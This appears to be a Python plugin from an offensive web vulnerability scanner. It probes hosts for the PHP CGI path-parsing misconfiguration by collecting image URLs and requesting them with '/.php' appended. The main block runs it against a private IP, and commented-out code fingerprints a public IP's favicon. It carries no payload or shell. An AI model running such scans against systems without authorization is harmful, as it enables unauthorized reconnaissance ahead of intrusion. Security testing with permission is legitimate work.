# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
import re

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'PHP Parse Bug'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.NONE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/']
        # exec
        self.execPathList = []
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = 'php parse bug'
        self.imagePath = ''
        self.imageExt = ['ico', 'jpg', 'gif', 'png', 'jpeg']
        self.imageExtCompile = '"([{}]?[^"]+\.({}))"'.format(self.target, '|'.join(self.imageExt))
        self.reCompile = re.compile(self.imageExtCompile)

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False, allow_redirects=False) as response:
                        if response is not None:
                            text = await response.text()
                            await asyncio.sleep(2)
                            retImages = self.reCompile.findall(text)
                            if retImages:
                                for _ in retImages:
                                    if url in _[0]:
                                        imageUrl = _[0]
                                    else:
                                        imageUrl = url + '/' + _[0]
                                    async with session.get(url=imageUrl, headers=self.headers, timeout=10, verify_ssl=False,
                                                           allow_redirects=False) as response1:
                                        if response1.status == 200:
                                            self.flag = True
                                            self.execPathList.append(imageUrl)
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'{execPath}/.php' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{execPath}/.php'
                    async with session.get(url=url, timeout=10, verify_ssl=False, allow_redirects=False) as response:
                        if response is not None and response.status == 200:
                            header = response.headers
                            text = await response.read()
                            await asyncio.sleep(2)
                            if b'\x00' in text:
                                if 'Content-Type' in header.keys() and 'text/html' in header['Content-Type']:
                                    tqdm.write(Fore.RED + '[{}] {}'.format('PHP Parse Bug', url))
                                    return {'name': 'PHP Parse Bug', 'url': url, 'software': 'PHP Parse Bug'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        # self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib

    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.129', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
